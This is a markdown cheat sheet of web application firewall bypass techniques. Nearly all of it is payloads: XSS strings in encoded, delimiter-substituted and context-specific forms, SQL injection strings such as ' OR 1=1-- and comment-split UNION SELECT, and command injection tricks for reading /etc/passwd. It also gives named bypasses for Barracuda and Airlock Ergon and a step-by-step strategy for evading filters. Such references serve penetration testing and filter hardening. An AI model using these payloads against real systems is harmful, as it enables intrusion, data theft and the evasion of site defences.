# WAF Bypass Techniques

## Generic Techniques

### Encoding
```
# Base64 data URI
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

# URL encoding (single)
%3Cscript%3Ealert(1)%3C/script%3E

# Double URL encoding
%253Cscript%253Ealert(1)%25253C%252Fscript%253E

# Unicode lookalikes
# ē instead of e (some WAFs normalize, some don't)
```

### Space/Delimiter Substitution
```html
<Img/src=x/onerror=alert(1)>        # / instead of space
<svg%09onload=alert(1)>             # tab (%09)
<svg%0Aonload=alert(1)>             # newline (%0A)
<svg%0Donload=alert(1)>             # carriage return (%0D)
```

### SQL Injection Comments
```sql
SE/**/LECT 1,2,3
UN/**/ION SEL/**/ECT
' OR '1'='1
' OR 1=1--
```

### Case Variation
```sql
SeLeCt 1,2,3
uNiOn SeLeCt
```

### Command Injection Bypass
```bash
# Wildcard expansion
/etc/pa*wd
/etc/pa??wd
/e??/p????

# Quote breaking
/etc/pa's'wd
/etc/pa"s"wd

# ${IFS} instead of spaces
cat${IFS}/etc/passwd

# Backslash
/etc/pa\swd
```

### Custom HTML Tags
```html
<CUSTOM id=x onfocus=alert(1) tabindex=1>#x
<x-onclick=alert(1)>click
```

## WAF-Specific Bypasses

### Barracuda
```html
<body style="height:1000px" onwheel="alert(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
<a href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At:open()>clickhere
```
Key insight: Barracuda doesn't filter `onwheel` event handler. URL-encoding every other character of "javascript" (%0A between chars) bypasses keyword detection.

### Airlock Ergon
```sql
%C0%80' union+select+col1,col2,col3+from+table+--+
```
Key insight: Uses NULL bytes (%C0%80) and + for spaces.

### General HTMLi via Parameter Pollution
```
# Duplicate parameters may confuse WAF vs application parsing
?param=safe&param=<script>alert(1)</script>
```

## XSS in Specific Contexts

### Inside JavaScript Strings
```javascript
'; alert(1)//
\'; alert(1)//
</script><script>alert(1)</script>
```

### Inside HTML Attributes
```html
" onmouseover="alert(1)
' onfocus='alert(1) autofocus="
javascript:alert(1)
```

### Inside CSS
```css
expression(alert(1))
url("javascript:alert(1)")
```

### Inside URLs
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
vbscript:msgbox(1)    # IE only
```

## Filter Detection Strategy

1. **Identify the filter:** Inject a unique string and see what gets blocked
2. **Determine context:** HTML, JS string, attribute, URL?
3. **Test encoding:** URL encode, double encode, HTML entities
4. **Test delimiter substitution:** tab, newline, /, backslash
5. **Test case variation:** SeLeCt vs select
6. **Test keyword splitting:** scr<script>ipt
7. **Test alternative payloads:** Different event handlers, different tags

## Complete WAF Bypass Reference

See [Awesome-WAF](https://github.com/0xInfection/Awesome-WAF#known-bypasses) for WAF-specific bypass collections.
